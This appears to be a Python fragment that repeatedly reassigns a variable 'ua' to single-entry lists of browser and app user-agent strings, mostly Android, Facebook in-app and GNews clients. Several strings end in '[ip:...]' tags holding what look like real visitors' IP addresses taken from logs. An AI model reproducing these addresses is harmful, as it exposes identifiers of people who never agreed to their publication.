ua = ["Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["UCWEB/2.0 (Windows; U; wds 8.0; en-US; NOKIA; RM-914eurussia229) U2/1.0.0 UCBrowser/3.4.1.407 U2/1.0.0 Mobile",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:151.29.41.6",]
ua = ["Opera/5.0 (Windows; Windows NT 6.1; en-us) like Gecko Safari/533.51",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.71.101",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A515F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118458",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A025G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (5098233024)",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2210129SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 EdgA/110.0.1587.66",]
ua = ["Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:37.163.16.253",]
ua = ["Mozilla/5.0 (Linux; Android 9; moto e6 play Build/POAS29.550-132-25; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2010J19CG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 [ip:151.47.66.179",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; moto e5 Build/OPPS27.91-176-11-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:93.36.176.173",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; LM-X410.F Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 9; S40 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 [ip:37.161.65.123",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2371 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118458",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.43",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; LG-M400 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 [ip:151.57.48.177",]
ua = ["Mozilla/5.0 (Linux; Android 9; TA-1004 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto g41 Build/S3RWS32.138-29-3-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.41.211]",]
ua = ["Mozilla/5.0 (Linux; Android 9; VKY-L09 Build/HUAWEIVKY-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A326B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) power Build/QQ3A.200805.001)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; nami Build/R110-15278.72.0)",]
ua = ["Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QPOS30.52-29-7-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230305.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; 21091116UG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; HD1900 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A325F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44 [ip:79.21.53.92",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A380 [FBAN/FBIOS;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.2;FBSS/3;FBID/phone;FBLC/ro_RO;FBOP/5",]
ua = ["Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3241 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; G8141) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ua = ["TuneIn Radio Pro/25.1.0; iPad13,1; iPadOS/16.3.1",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2067) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:79.35.142.204",]
ua = ["Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; M2103K19G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [ip:95.74.97.237",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41 Trailer/99.3.5162.63",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 [ip:46.123.253.114",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; 6127I Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93",]
ua = ["TuneIn Radio/24.7.0; iPad12,2; iPadOS/16.3.1",]
ua = ["TuneIn Radio/25.1.0; iPhone14,6; iOS/16.3",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A107M Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; LG-M700 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LVG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:176.201.122.178",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:2.37.165.126",]
ua = ["Mozilla/5.0 (Linux; Android 10; Like_Hi10_2021 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/120.0.6099.199 Safari/537.36 [ip:66.249.64.3",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-X110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;",]
ua = ["Mozilla/5.0 (Linux; Android 12; REVVL V+ 5G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62 [ip:101.56.8.93",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 [ip:87.18.55.100",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A5260 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Line/14.0.2/IAB",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1 [ip:78.211.214.225",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A525M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:109.54.118.174",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 [ip:151.42.171.251",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A536B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:93.55.20.195",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5) Build/OPP28.85-19-4-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; 2311DRN14I Build/TP1A.220624.014)",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOV32.121-56; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["radio2/187 CFNetwork/1492.0.1 Darwin/23.3.0",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G870A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 [ip:88.239.17.63",]
ua = ["Mozilla/5.0 (Linux; Android 13; moto e13 Build/TLAS33.105-257-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/446.0.0.32.330;FBBV/554572428;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/558132887",]
ua = ["ExoPlayerDemo/1.2.227-lite (Linux;Android 12) ExoPlayerLib/2.8.2",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.1; JC01 Build/PPR1.180610.011)",]
ua = ["TuneIn Radio/27.1.0; iPhone10,2; iOS/16.1.1",]
ua = ["radio.pt 5.7.4 (iPhone; iPhone OS 17.2.1; pt_BR)",]
ua = ["Mozilla/5.0 (Linux; Android 11; motorola one fusion+ Build/RPIS31.Q2-42-25-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/121.0.6167.66 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A047F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/446.0.0.32.330;FBBV/554572428;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/557779329",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; CPH2411 Build/UKQ1.230924.001)",]
ua = ["Mozilla/5.0 (Linux; Android 10; LGL322DL Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10.0; F808 Build/LRX21M)",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 [ip:104.28.85.111",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 AtContent/94.5.4324.25",]
ua = ["Mozilla/5.0 (Linux; Android 12; NAM-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; TORNADO Android TV Build/QTG3.200617.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; G93 Build/TP1A.220624.014)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.00.6330.d4 Build/RP1A.201105.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; SO-52C Build/65.2.B.2.112)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; REA-AN00 Build/HONORREA-AN00) SP-engine/2.92.0 baiduboxapp/13.54.0.10 (Baidu; P1 13) dumedia/7.48.0.37',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13.1; Q96 Build/NRD91N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; XQ-CC72 Build/65.2.A.2.137)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; HD801 4K Build/QP1A.191105.004)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; onn. 4K Streaming Box Build/SGZ2.230609.049.A1)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; Chromecast HD Build/STTL.240206.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7329.3851N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016) AppleWebKit [PB/172] (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTT7.231021.001)',]
